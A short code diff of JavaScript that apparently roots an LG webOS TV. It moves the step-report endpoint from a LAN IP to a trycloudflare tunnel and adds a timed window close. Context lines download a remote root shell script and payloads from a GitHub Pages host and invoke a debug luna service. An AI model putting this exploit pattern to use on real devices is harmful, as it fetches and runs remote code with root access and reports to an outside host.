@@ -28,7 +28,7 @@
     var scriptPath = '/media/internal/downloads/root_v3.sh'
     var downloadTarget = 'https://jyooi.github.io/tv-payload/root_v3.sh'
     var payloadBase = 'https://jyooi.github.io/tv-payload/payload/'
-    var reportBase = 'http://192.168.100.231:8899/report/step/'
+    var reportBase = 'https://magnificent-cancelled-sprint-boxed.trycloudflare.com/report/step/'
     var targetDir = '/media/internal/downloads'
     var SEMI = String.fromCharCode(59)
 
@@ -86,6 +86,7 @@
           reportStep('inject-legacy-accepted')
         }
       }
+      setTimeout(function () { try { window.close() } catch (e) {} }, 45000)
       bridge.call('luna://com.webos.service.legacybroadcast.debug/menu',
         JSON.stringify({
           menu: 'ci',
